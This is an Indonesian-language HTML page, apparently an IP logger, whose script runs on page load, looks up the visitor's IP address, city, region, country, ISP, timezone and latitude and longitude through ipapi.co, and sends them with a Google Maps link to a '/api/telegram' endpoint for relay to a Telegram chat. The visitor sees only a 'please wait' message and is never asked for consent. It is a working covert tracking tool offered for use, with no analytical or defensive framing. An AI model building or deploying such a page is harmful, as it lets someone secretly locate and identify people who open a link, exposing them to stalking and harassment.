<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Pelacak IP & Lokasi</title>
</head>
<body>
  <h2>Memproses pelacakan lokasi...</h2>
  <p id="status">Mohon tunggu...</p>

  <script>
    async function sendTelegramMessage(text) {
      try {
        const res = await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message: text })
        });
        const data = await res.json();

        if (!data.ok) {
          document.getElementById('status').innerText = 'Gagal kirim pesan: ' + data.error;
        } else {
          document.getElementById('status').innerText = 'Lokasi berhasil dikirim ke Telegram!';
        }
      } catch (error) {
        document.getElementById('status').innerText = 'Terjadi error saat mengirim pesan.';
        console.error(error);
      }
    }

    async function trackLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const ip = data.ip || 'N/A';
        const city = data.city || 'N/A';
        const region = data.region || 'N/A';
        const country = data.country_name || 'N/A';
        const org = data.org || 'N/A';
        const timezone = data.timezone || 'N/A';
        const lat = data.latitude || 'N/A';
        const lon = data.longitude || 'N/A';
        const timeNow = new Date().toLocaleString();

        const message =
`🌍 *Pengunjung Baru!*

📡 IP: \`${ip}\`
🏙️ Kota: ${city}
🗺️ Wilayah: ${region}
🌐 Negara: ${country}
📍 Koordinat: ${lat}, ${lon}
🏢 ISP/Org: ${org}
🕒 Waktu Akses: ${timeNow}
⏱ Zona Waktu: ${timezone}
🗺️ [Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;

        sendTelegramMessage(message);

      } catch (error) {
        document.getElementById('status').innerText = 'Gagal mengambil lokasi.';
        console.error(error);
      }
    }

    trackLocation();
  </script>
</body>
</html>
